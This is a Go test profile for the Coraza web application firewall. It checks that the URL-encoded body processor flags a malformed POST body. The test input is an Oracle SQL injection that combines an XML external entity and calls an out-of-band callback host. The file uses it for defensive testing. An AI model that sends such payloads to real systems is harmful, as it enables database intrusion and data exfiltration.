package engine

import (
	"github.com/corazawaf/coraza/v3/testing/profile"
)

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.ProfileMeta{
		Author:      "jptosso",
		Description: "Test if the body processors work",
		Enabled:     true,
		Name:        "posturlencoded.yaml",
	},
	Tests: []profile.ProfileTest{
		{
			Title: "posturlencoded",
			Stages: []profile.ProfileStage{
				{
					Stage: profile.ProfileSubStage{
						Input: profile.ProfileStageInput{
							URI:    "/",
							Method: "POST",
							Data:   `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`,
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{100},
						},
					},
				},
			},
		},
	},
	Rules: `
SecRequestBodyAccess On
SecAction "id:1, phase:1, ctl:forceRequestBodyVariable=on"
# urlencoded_error must be set because of the invalid payload
SecRule &URLENCODED_ERROR "!@eq 0" "id: 100, log"
`,
})
